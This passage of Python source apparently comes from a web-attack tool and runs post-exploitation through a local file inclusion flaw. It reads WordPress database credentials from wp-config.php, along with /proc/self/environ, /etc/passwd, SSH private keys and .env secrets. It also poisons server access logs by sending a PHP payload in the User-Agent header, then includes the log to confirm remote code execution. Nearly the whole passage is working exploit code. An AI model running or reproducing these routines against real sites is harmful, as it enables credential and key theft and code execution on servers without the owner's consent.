    escalation_level: "none" < "creds" < "log_poison_rce"
    """
    result: dict = {
        "wp_config_db_name": None,
        "wp_config_db_user": None,
        "wp_config_db_pass_found": False,
        "proc_environ": None,
        "access_log_path": None,
        "escalation_level": "none",
    }
    # 1. wp-config.php — DB credentials
    try:
        cfg = request_fn("/var/www/html/wp-config.php")
        if cfg and "DB_NAME" in cfg:
            _m_name = re.search(r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
            _m_user = re.search(r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
            _m_pass = re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
            if _m_name or _m_user:
                result["wp_config_db_name"] = _m_name.group(1) if _m_name else None
                result["wp_config_db_user"] = _m_user.group(1) if _m_user else None
                result["wp_config_db_pass_found"] = bool(_m_pass)
                result["escalation_level"] = "creds"
                step(f"  post-lfi: wp-config.php — DB_NAME={result['wp_config_db_name']}, "
                     f"DB_USER={result['wp_config_db_user']}")
    except Exception:
        pass

    # 2. /proc/self/environ — may contain DB_PASSWORD, SECRET_KEY
    try:
        env = request_fn("/proc/self/environ")
        if env and ("DB_PASSWORD" in env or "DB_HOST" in env or "SECRET" in env):
            result["proc_environ"] = env[:300]
            result["escalation_level"] = "creds"
            step("  post-lfi: /proc/self/environ leaked DB credentials or secrets")
    except Exception:
        pass

    # 3. Apache/Nginx access log — test log poisoning path
    _log_candidates = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/proc/self/fd/1",
    ]
    for _logpath in _log_candidates:
        try:
            body = request_fn(_logpath)
            if body and len(body) > 20 and "404" not in body[:50]:
                result["access_log_path"] = _logpath
                step(f"  post-lfi: acceso a log {_logpath!r} confirmado — "
                     f"log poisoning para RCE es viable")
                # Inject PHP in User-Agent, then include the log
                try:
                    import urllib.request as _ur
                    _poison_req = _ur.Request(
                        base_url, headers={"User-Agent": "<?php echo 'PWNED:'.id(); ?>"})
                    with _ur.urlopen(_poison_req, timeout=5) as _pr:
                        pass
                    _poison_body = request_fn(_logpath)
                    if _poison_body and "PWNED:" in _poison_body:
                        result["log_poison_rce"] = True
                        result["escalation_level"] = "log_poison_rce"
                        step("  post-lfi: log poisoning RCE CONFIRMADO — PWNED: aparece en log")
                except Exception:
                    pass
                break
        except Exception:
            pass

    # 4. /etc/passwd — user enumeration
    try:
        passwd = request_fn("/etc/passwd")
        if passwd and "root:" in passwd:
            _users = [ln.split(":")[0] for ln in passwd.splitlines()
                      if ln.strip() and not ln.startswith("#")][:10]
            result["etc_passwd_users"] = _users
            if result["escalation_level"] == "none":
                result["escalation_level"] = "creds"
            step(f"  post-lfi: /etc/passwd leido — {len(_users)} usuarios: {_users[:5]}")
    except Exception:
        pass

    # 5. SSH private key for www-data/root
    for _ssh_path in ("/root/.ssh/id_rsa", "/var/www/.ssh/id_rsa", "/home/www-data/.ssh/id_rsa"):
        try:
            _key = request_fn(_ssh_path)
            if _key and "PRIVATE KEY" in _key:
                result["ssh_private_key_found"] = _ssh_path
                result["escalation_level"] = "log_poison_rce"
                step(f"  post-lfi: SSH private key encontrada en {_ssh_path!r}")
                break
        except Exception:
            pass

    # 6. .env file
    for _env_path in ("/var/www/html/.env", "/var/www/.env", "/app/.env"):
        try:
            _env = request_fn(_env_path)
            if _env and ("APP_KEY=" in _env or "DB_PASSWORD=" in _env or "SECRET=" in _env):
                _env_keys = [ln.split("=")[0] for ln in _env.splitlines()
                             if "=" in ln and not ln.startswith("#")][:15]
                result["dotenv_found"] = _env_path
                result["dotenv_keys"] = _env_keys
                if result["escalation_level"] == "none":
                    result["escalation_level"] = "creds"
                step(f"  post-lfi: .env leido en {_env_path!r} — claves: {_env_keys[:5]}")
                break
        except Exception:
            pass

    return result
